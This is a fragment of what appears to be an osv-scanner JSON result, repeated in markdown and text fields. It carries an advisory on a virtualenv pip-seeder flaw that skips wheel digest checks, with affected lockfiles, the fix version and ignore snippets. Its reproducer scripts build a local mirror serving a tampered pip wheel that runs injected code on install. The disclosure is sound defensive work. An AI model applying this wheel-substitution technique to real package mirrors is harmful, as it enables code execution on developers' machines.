              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-113717](https://osv.dev/CVE-2026-113717)**.\n\n## [GHSA-cx28-75q4-x26q](https://osv.dev/GHSA-cx28-75q4-x26q)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected.\n\u003e Index candidates on that path do not pass through virtualenv's wheel digest verification.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Wheel selection by the pip seeder when downloads are enabled.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e The pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy.\n\u003e Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e With `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so\n\u003e virtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the\n\u003e configured index. An index wheel with the same package and version as the bundled wheel can be selected without\n\u003e virtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the\n\u003e same option.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same\n\u003e filename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the\n\u003e second run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel;\n\u003e `env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting\n\u003e `BUG`.\n\u003e \n\u003e Both `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left\n\u003e `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained\n\u003e active. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is\n\u003e older, while the comparison with the default seeder arose when digest verification was added in 21.7.12.\n\u003e [PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with\n\u003e index lookup disabled.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant I as Index in pip.conf\n\u003e     participant V as virtualenv PipInvoke\n\u003e     participant P as pip install\n\u003e     participant E as Seeded environment\n\u003e     I-\u003e\u003eV: serve modified pip wheel\n\u003e     V-\u003e\u003eV: get_wheel(download=False)\n\u003e     V-\u003e\u003eP: install with --download permitting index lookup\n\u003e     P-\u003e\u003eI: select same-version index wheel\n\u003e     I-\u003e\u003eE: modified pip installed without virtualenv digest check\n\u003e     E-\u003e\u003eE: later pip invocation runs added code\n\u003e     Note over V,E: Default app-data seeder rejects the same digest\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import glob\n\u003e import hashlib\n\u003e import json\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e import zipfile\n\u003e \n\u003e from virtualenv.seed.wheels.embed import get_embed_wheel\n\u003e \n\u003e companions = \"/tmp/repro.d\"\n\u003e work = \"/tmp/repro-pip-seeder-download\"\n\u003e shutil.rmtree(work, ignore_errors=True)\n\u003e os.makedirs(work)\n\u003e \n\u003e # set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network)\n\u003e bundled = get_embed_wheel(\"pip\", f\"{sys.version_info.major}.{sys.version_info.minor}\")\n\u003e pypi_sha256 = hashlib.sha256(open(bundled.path, \"rb\").read()).hexdigest()\n\u003e pypi_release = {\"filename\": bundled.name, \"digests\": {\"sha256\": pypi_sha256}}\n\u003e os.makedirs(f\"{work}/pypi.org/pypi/pip\")\n\u003e with open(f\"{work}/pypi.org/pypi/pip/json\", \"w\") as pypi_json:\n\u003e     json.dump({\"releases\": {bundled.version: [pypi_release]}}, pypi_json)\n\u003e \n\u003e # attacker: the mirror serves other bytes under the bundled wheel's own file name\n\u003e marker = f\"{work}/MIRROR_CODE_RAN\"\n\u003e subprocess.run([sys.executable, f\"{companions}/make_mirror.py\", str(bundled.path), f\"{work}/mirror\", marker], check=True)\n\u003e mirror_wheel = f\"{work}/mirror/pip/{bundled.name}\"\n\u003e mirror_sha256 = hashlib.sha256(open(mirror_wheel, \"rb\").read()).hexdigest()\n\u003e print(f\"{bundled.name}: PyPI publishes sha256 {pypi_sha256}\")\n\u003e print(f\"{bundled.name}: the mirror serves  sha256 {mirror_sha256}\")\n\u003e \n\u003e # user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset\n\u003e with open(f\"{work}/pip.conf\", \"w\") as pip_conf:\n\u003e     pip_conf.write(f\"[global]\\nindex-url = file://{work}/mirror\\n\")  # file:// stands in for the mirror's http URL\n\u003e os.makedirs(f\"{work}/home-default\")\n\u003e os.makedirs(f\"{work}/home-pip\")  # one HOME per run, so neither sees the other's app-data or pip cache\n\u003e virtualenv = [sys.executable, f\"{companions}/virtualenv_offline.py\", f\"{work}/pypi.org\", \"--no-periodic-update\"]\n\u003e \n\u003e # control: the default seeder with --download fetches the mirror's wheel and refuses it\n\u003e default_seeder = subprocess.run(\n\u003e     [*virtualenv, \"--download\", f\"{work}/env-default\"],\n\u003e     env={**os.environ, \"HOME\": f\"{work}/home-default\", \"PIP_CONFIG_FILE\": f\"{work}/pip.conf\"},\n\u003e     capture_output=True,\n\u003e     text=True,\n\u003e )\n\u003e refusal = [line for line in default_seeder.stdout.splitlines() if line.startswith(\"RuntimeError: \")]\n\u003e print(f\"\\nCONTROL  virtualenv --download env-default: exit {default_seeder.returncode}\")\n\u003e print(\"\\n\".join(refusal))\n\u003e \n\u003e # trigger: the same command plus --seeder pip\n\u003e pip_seeder = subprocess.run(\n\u003e     [*virtualenv, \"--download\", \"--seeder\", \"pip\", f\"{work}/env-pip\"],\n\u003e     env={**os.environ, \"HOME\": f\"{work}/home-pip\", \"PIP_CONFIG_FILE\": f\"{work}/pip.conf\"},\n\u003e     capture_output=True,\n\u003e     text=True,\n\u003e )\n\u003e print(f\"\\nOBSERVED virtualenv --download --seeder pip env-pip: exit {pip_seeder.returncode}\")\n\u003e print(pip_seeder.stdout)\n\u003e if pip_seeder.returncode == 0:\n\u003e     env_pip = subprocess.run([f\"{work}/env-pip/bin/pip\", \"--version\"], capture_output=True, text=True, check=True)\n\u003e     print(f\"$ env-pip/bin/pip --version\\n{env_pip.stdout}\")\n\u003e \n\u003e # check: compare env-pip's pip/__init__.py with the one in each wheel\n\u003e with zipfile.ZipFile(bundled.path) as wheel:\n\u003e     bundled_init = wheel.read(\"pip/__init__.py\")\n\u003e with zipfile.ZipFile(mirror_wheel) as wheel:\n\u003e     mirror_init = wheel.read(\"pip/__init__.py\")\n\u003e installed = glob.glob(f\"{work}/env-pip/lib/python*/site-packages/pip/__init__.py\")\n\u003e installed_init = open(installed[0], \"rb\").read() if installed else b\"\"\n\u003e refusal_message = f\"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}\"\n\u003e refused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout\n\u003e print(f\"default seeder refused the mirror's wheel for its digest: {refused}\")\n\u003e print(f\"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}\")\n\u003e print(f\"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}\")\n\u003e print(\"BUG\" if refused and installed_init == mirror_init and os.path.exists(marker) else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/make_mirror.py`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e # usage: make_mirror.py \u003cgenuine pip wheel\u003e \u003cmirror directory\u003e \u003cmarker file the payload writes\u003e\n\u003e import os\n\u003e import sys\n\u003e import zipfile\n\u003e \n\u003e genuine_wheel, mirror, marker = sys.argv[1:]\n\u003e wheel_name = os.path.basename(genuine_wheel)\n\u003e payload = f\"\\nopen({marker!r}, 'w').write('mirror code ran')\\n\"\n\u003e \n\u003e os.makedirs(f\"{mirror}/pip\")\n\u003e with zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f\"{mirror}/pip/{wheel_name}\", \"w\") as served:\n\u003e     for entry in genuine.infolist():\n\u003e         data = genuine.read(entry)\n\u003e         if entry.filename == \"pip/__init__.py\":\n\u003e             data += payload.encode()\n\u003e         served.writestr(entry, data)\n\u003e \n\u003e # PEP 503 project page; pip reads \u003cindex\u003e/pip/index.html for a file:// index\n\u003e with open(f\"{mirror}/pip/index.html\", \"w\") as page:\n\u003e     page.write(f'\u003ca href=\"{wheel_name}\"\u003e{wheel_name}\u003c/a\u003e\\n')\n\u003e ```\n\u003e \n\u003e **`repro.d/virtualenv_offline.py`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e # usage: virtualenv_offline.py \u003cdirectory standing in for https://pypi.org\u003e \u003cvirtualenv arguments...\u003e\n\u003e # The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder\n\u003e # checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched.\n\u003e import sys\n\u003e \n\u003e from virtualenv.__main__ import run_with_catch\n\u003e from virtualenv.seed.wheels import periodic_update\n\u003e \n\u003e pypi_org = sys.argv[1]\n\u003e \n\u003e \n\u003e def pypi_json_api(url, context=None):\n\u003e     return open(url.replace(\"https://pypi.org\", pypi_org), \"rb\")\n\u003e \n\u003e \n\u003e periodic_update.urlopen = pypi_json_api\n\u003e run_with_catch(sys.argv[2:])\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e The default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by\n\u003e itself defeat TLS or establish control of an index response.\n\u003e \n\u003e Severity: low.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix acquires wheels through the shared verification path and installs pinned names with index lookup\n\u003e disabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze\n\u003e output.\n\u003e \n\u003e Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e On older releases, use embedded wheels without downloads, or acquire and verify approved seed archives\n\u003e separately.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-cx28-75q4-x26q | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113717\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113717\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-113717](https://osv.dev/CVE-2026-113717)**.\n\n## [GHSA-cx28-75q4-x26q](https://osv.dev/GHSA-cx28-75q4-x26q)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected.\n\u003e Index candidates on that path do not pass through virtualenv's wheel digest verification.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Wheel selection by the pip seeder when downloads are enabled.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e The pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy.\n\u003e Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e With `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so\n\u003e virtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the\n\u003e configured index. An index wheel with the same package and version as the bundled wheel can be selected without\n\u003e virtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the\n\u003e same option.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same\n\u003e filename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the\n\u003e second run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel;\n\u003e `env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting\n\u003e `BUG`.\n\u003e \n\u003e Both `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left\n\u003e `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained\n\u003e active. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is\n\u003e older, while the comparison with the default seeder arose when digest verification was added in 21.7.12.\n\u003e [PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with\n\u003e index lookup disabled.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant I as Index in pip.conf\n\u003e     participant V as virtualenv PipInvoke\n\u003e     participant P as pip install\n\u003e     participant E as Seeded environment\n\u003e     I-\u003e\u003eV: serve modified pip wheel\n\u003e     V-\u003e\u003eV: get_wheel(download=False)\n\u003e     V-\u003e\u003eP: install with --download permitting index lookup\n\u003e     P-\u003e\u003eI: select same-version index wheel\n\u003e     I-\u003e\u003eE: modified pip installed without virtualenv digest check\n\u003e     E-\u003e\u003eE: later pip invocation runs added code\n\u003e     Note over V,E: Default app-data seeder rejects the same digest\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import glob\n\u003e import hashlib\n\u003e import json\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e import zipfile\n\u003e \n\u003e from virtualenv.seed.wheels.embed import get_embed_wheel\n\u003e \n\u003e companions = \"/tmp/repro.d\"\n\u003e work = \"/tmp/repro-pip-seeder-download\"\n\u003e shutil.rmtree(work, ignore_errors=True)\n\u003e os.makedirs(work)\n\u003e \n\u003e # set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network)\n\u003e bundled = get_embed_wheel(\"pip\", f\"{sys.version_info.major}.{sys.version_info.minor}\")\n\u003e pypi_sha256 = hashlib.sha256(open(bundled.path, \"rb\").read()).hexdigest()\n\u003e pypi_release = {\"filename\": bundled.name, \"digests\": {\"sha256\": pypi_sha256}}\n\u003e os.makedirs(f\"{work}/pypi.org/pypi/pip\")\n\u003e with open(f\"{work}/pypi.org/pypi/pip/json\", \"w\") as pypi_json:\n\u003e     json.dump({\"releases\": {bundled.version: [pypi_release]}}, pypi_json)\n\u003e \n\u003e # attacker: the mirror serves other bytes under the bundled wheel's own file name\n\u003e marker = f\"{work}/MIRROR_CODE_RAN\"\n\u003e subprocess.run([sys.executable, f\"{companions}/make_mirror.py\", str(bundled.path), f\"{work}/mirror\", marker], check=True)\n\u003e mirror_wheel = f\"{work}/mirror/pip/{bundled.name}\"\n\u003e mirror_sha256 = hashlib.sha256(open(mirror_wheel, \"rb\").read()).hexdigest()\n\u003e print(f\"{bundled.name}: PyPI publishes sha256 {pypi_sha256}\")\n\u003e print(f\"{bundled.name}: the mirror serves  sha256 {mirror_sha256}\")\n\u003e \n\u003e # user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset\n\u003e with open(f\"{work}/pip.conf\", \"w\") as pip_conf:\n\u003e     pip_conf.write(f\"[global]\\nindex-url = file://{work}/mirror\\n\")  # file:// stands in for the mirror's http URL\n\u003e os.makedirs(f\"{work}/home-default\")\n\u003e os.makedirs(f\"{work}/home-pip\")  # one HOME per run, so neither sees the other's app-data or pip cache\n\u003e virtualenv = [sys.executable, f\"{companions}/virtualenv_offline.py\", f\"{work}/pypi.org\", \"--no-periodic-update\"]\n\u003e \n\u003e # control: the default seeder with --download fetches the mirror's wheel and refuses it\n\u003e default_seeder = subprocess.run(\n\u003e     [*virtualenv, \"--download\", f\"{work}/env-default\"],\n\u003e     env={**os.environ, \"HOME\": f\"{work}/home-default\", \"PIP_CONFIG_FILE\": f\"{work}/pip.conf\"},\n\u003e     capture_output=True,\n\u003e     text=True,\n\u003e )\n\u003e refusal = [line for line in default_seeder.stdout.splitlines() if line.startswith(\"RuntimeError: \")]\n\u003e print(f\"\\nCONTROL  virtualenv --download env-default: exit {default_seeder.returncode}\")\n\u003e print(\"\\n\".join(refusal))\n\u003e \n\u003e # trigger: the same command plus --seeder pip\n\u003e pip_seeder = subprocess.run(\n\u003e     [*virtualenv, \"--download\", \"--seeder\", \"pip\", f\"{work}/env-pip\"],\n\u003e     env={**os.environ, \"HOME\": f\"{work}/home-pip\", \"PIP_CONFIG_FILE\": f\"{work}/pip.conf\"},\n\u003e     capture_output=True,\n\u003e     text=True,\n\u003e )\n\u003e print(f\"\\nOBSERVED virtualenv --download --seeder pip env-pip: exit {pip_seeder.returncode}\")\n\u003e print(pip_seeder.stdout)\n\u003e if pip_seeder.returncode == 0:\n\u003e     env_pip = subprocess.run([f\"{work}/env-pip/bin/pip\", \"--version\"], capture_output=True, text=True, check=True)\n\u003e     print(f\"$ env-pip/bin/pip --version\\n{env_pip.stdout}\")\n\u003e \n\u003e # check: compare env-pip's pip/__init__.py with the one in each wheel\n\u003e with zipfile.ZipFile(bundled.path) as wheel:\n\u003e     bundled_init = wheel.read(\"pip/__init__.py\")\n\u003e with zipfile.ZipFile(mirror_wheel) as wheel:\n\u003e     mirror_init = wheel.read(\"pip/__init__.py\")\n\u003e installed = glob.glob(f\"{work}/env-pip/lib/python*/site-packages/pip/__init__.py\")\n\u003e installed_init = open(installed[0], \"rb\").read() if installed else b\"\"\n\u003e refusal_message = f\"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}\"\n\u003e refused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout\n\u003e print(f\"default seeder refused the mirror's wheel for its digest: {refused}\")\n\u003e print(f\"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}\")\n\u003e print(f\"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}\")\n\u003e print(\"BUG\" if refused and installed_init == mirror_init and os.path.exists(marker) else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/make_mirror.py`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e # usage: make_mirror.py \u003cgenuine pip wheel\u003e \u003cmirror directory\u003e \u003cmarker file the payload writes\u003e\n\u003e import os\n\u003e import sys\n\u003e import zipfile\n\u003e \n\u003e genuine_wheel, mirror, marker = sys.argv[1:]\n\u003e wheel_name = os.path.basename(genuine_wheel)\n\u003e payload = f\"\\nopen({marker!r}, 'w').write('mirror code ran')\\n\"\n\u003e \n\u003e os.makedirs(f\"{mirror}/pip\")\n\u003e with zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f\"{mirror}/pip/{wheel_name}\", \"w\") as served:\n\u003e     for entry in genuine.infolist():\n\u003e         data = genuine.read(entry)\n\u003e         if entry.filename == \"pip/__init__.py\":\n\u003e             data += payload.encode()\n\u003e         served.writestr(entry, data)\n\u003e \n\u003e # PEP 503 project page; pip reads \u003cindex\u003e/pip/index.html for a file:// index\n\u003e with open(f\"{mirror}/pip/index.html\", \"w\") as page:\n\u003e     page.write(f'\u003ca href=\"{wheel_name}\"\u003e{wheel_name}\u003c/a\u003e\\n')\n\u003e ```\n\u003e \n\u003e **`repro.d/virtualenv_offline.py`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e # usage: virtualenv_offline.py \u003cdirectory standing in for https://pypi.org\u003e \u003cvirtualenv arguments...\u003e\n\u003e # The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder\n\u003e # checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched.\n\u003e import sys\n\u003e \n\u003e from virtualenv.__main__ import run_with_catch\n\u003e from virtualenv.seed.wheels import periodic_update\n\u003e \n\u003e pypi_org = sys.argv[1]\n\u003e \n\u003e \n\u003e def pypi_json_api(url, context=None):\n\u003e     return open(url.replace(\"https://pypi.org\", pypi_org), \"rb\")\n\u003e \n\u003e \n\u003e periodic_update.urlopen = pypi_json_api\n\u003e run_with_catch(sys.argv[2:])\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e The default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by\n\u003e itself defeat TLS or establish control of an index response.\n\u003e \n\u003e Severity: low.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix acquires wheels through the shared verification path and installs pinned names with index lookup\n\u003e disabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze\n\u003e output.\n\u003e \n\u003e Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e On older releases, use embedded wheels without downloads, or acquire and verify approved seed archives\n\u003e separately.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-cx28-75q4-x26q | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113717\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113717\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
